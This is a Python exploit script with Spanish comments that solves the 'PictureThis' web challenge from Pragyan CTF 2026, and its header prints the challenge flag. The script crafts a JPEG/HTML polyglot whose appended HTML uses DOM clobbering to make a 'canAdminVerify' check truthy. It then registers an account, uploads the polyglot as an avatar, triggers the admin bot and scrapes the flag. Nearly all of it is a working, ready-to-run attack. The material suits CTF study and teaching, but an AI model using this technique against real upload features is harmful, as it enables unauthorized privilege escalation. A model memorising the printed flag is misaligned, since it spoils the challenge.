#!/usr/bin/env python3
"""
PictureThis — Pragyan CTF 2026
Flag: p_ctf{i_M!ss#d_Th#_JPG_5f899f05}

Exploit: JPEG polyglot + DOM Clobbering
  - cdn.js reconoce .jpeg pero NO .jpg → JPEG servido como text/html
  - admin-helper.js checa window.config.canAdminVerify → controlable via DOM
"""
import struct
import requests
import time
import re
import sys

URL = "https://picture.ctf.prgy.in"
USERNAME = f"exploit_{int(time.time())}"
PASSWORD = "Exploit1234!"

# ──────────────────────────────────────────────
# Paso 1: Crear JPEG polyglot con DOM Clobbering
# ──────────────────────────────────────────────

def build_polyglot():
    """Crea un JPEG válido (pasa fileTypeFromFile) con HTML al final."""
    # SOI (Start of Image)
    jpeg = b'\xff\xd8'

    # APP0 marker (JFIF)
    app0 = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xe0' + struct.pack('>H', len(app0) + 2) + app0

    # DQT (Define Quantization Table)
    dqt = b'\x00' + b'\x01' * 64
    jpeg += b'\xff\xdb' + struct.pack('>H', len(dqt) + 2) + dqt

    # SOF0 (Start of Frame — 1x1 pixel, 1 componente)
    sof = b'\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc0' + struct.pack('>H', len(sof) + 2) + sof

    # DHT (Define Huffman Table — tabla vacía)
    dht = b'\x00' + b'\x00' * 16 + b'\x00'
    jpeg += b'\xff\xc4' + struct.pack('>H', len(dht) + 2) + dht

    # SOS (Start of Scan) + datos mínimos
    sos = b'\x01\x01\x00\x00\x3f\x00'
    jpeg += b'\xff\xda' + struct.pack('>H', len(sos) + 2) + sos
    jpeg += b'\x7f\x00'

    # EOI (End of Image)
    jpeg += b'\xff\xd9'

    # HTML para DOM Clobbering (después del JPEG)
    # <form id="config"> → window.config = <form> (truthy)
    # <input name="canAdminVerify"> → window.config.canAdminVerify = <input> (truthy)
    html = b'\n<html><body>'
    html += b'<form id="config"><input name="canAdminVerify" value="1"></form>'
    html += b'</body></html>'

    return jpeg + html

# ──────────────────────────────────────────────
# Paso 2: Registrar, login, subir avatar
# ──────────────────────────────────────────────

s = requests.Session()
s.verify = False

# Suprimir warnings de SSL
import urllib3
urllib3.disable_warnings()

print(f"[*] Registrando usuario: {USERNAME}")
r = s.post(f"{URL}/register", data={"username": USERNAME, "password": PASSWORD})

print("[*] Login...")
r = s.post(f"{URL}/login", data={"username": USERNAME, "password": PASSWORD})

print("[*] Generando JPEG polyglot con DOM Clobbering...")
polyglot = build_polyglot()
print(f"    Tamaño: {len(polyglot)} bytes")

print("[*] Subiendo avatar polyglot...")
r = s.post(f"{URL}/profile",
           data={"display_name": "Polyglot"},
           files={"avatar": ("polyglot.jpg", polyglot, "image/jpeg")})

# Verificar que el avatar se guardó como .jpg
r = s.get(f"{URL}/profile")
m = re.search(r'src="/_image/([^"]+\.jpg)"', r.text)
if not m:
    print("[!] ERROR: Avatar no se guardó como .jpg")
    sys.exit(1)

avatar_name = m.group(1)
print(f"[+] Avatar guardado: {avatar_name}")

# Verificar content-type
r = s.head(f"{URL}/_image/{avatar_name}")
ct = r.headers.get("content-type", "")
print(f"[*] Content-Type del avatar: {ct}")
if "text/html" not in ct:
    print("[!] WARNING: No se sirve como text/html — el exploit podría fallar")

# ──────────────────────────────────────────────
# Paso 3: Solicitar verificación
# ──────────────────────────────────────────────

print("[*] Solicitando verificación (el bot visitará el avatar)...")
r = s.post(f"{URL}/verify")

print("[*] Esperando 12 segundos para que el bot procese...")
time.sleep(12)

# ──────────────────────────────────────────────
# Paso 4: Recoger la flag
# ──────────────────────────────────────────────

r = s.get(f"{URL}/profile")

flag_match = re.search(r'p_ctf\{[^}]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"\n[+] Flag encontrada")
    print(f"[+] {flag}")
else:
    # Verificar estado
    if "Verified" in r.text:
        print("[+] Usuario verificado, pero no se encontró flag en el HTML")
        print("[*] Buscando en el HTML...")
        for line in r.text.split('\n'):
            if 'flag' in line.lower() or 'ctf' in line.lower():
                print(f"    {line.strip()}")
    else:
        print("[!] No verificado. Revisar reviews:")
        r2 = s.get(f"{URL}/verify")
        reviews = re.findall(r'<li[^>]*>(.*?)</li>', r2.text)
        for rev in reviews:
            print(f"    {rev}")
